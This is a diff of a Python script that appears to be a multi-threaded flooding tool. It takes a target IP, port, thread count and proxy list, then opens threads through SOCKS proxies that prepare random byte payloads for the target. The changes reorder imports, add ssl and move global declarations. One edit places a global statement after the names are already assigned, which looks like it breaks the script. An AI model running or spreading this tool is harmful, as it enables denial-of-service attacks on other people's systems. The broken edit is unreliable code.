@@ -1,4 +1,6 @@
-import os,sys
+import os
+import sys
+import ssl
 import threading
 import socks
 import socket
@@ -6,7 +8,6 @@ import random
 import requests
 
 def main():
-    global ip, port, threads, proxies, x
     ip = str(sys.argv[1])
     port = int(sys.argv[2])
     threads = int(sys.argv[3])
@@ -22,6 +23,7 @@ def main():
     f.close()
     proxies = open(str(sys.argv[4])).readlines()
     x = int(0)
+    global ip, port, threads, proxies, x
     for x in range(threads):
         Socks(x+1).start()
 
@@ -31,7 +33,7 @@ class Socks(threading.Thread):
         self.counter = counter
 
     def run(self):
-        global req_code, error
+        global s
         auth = random._urandom(1024)
         data = random._urandom(9048)
         #auth = bytearray.fromhex("030000130ee00000000000010008000b000000")
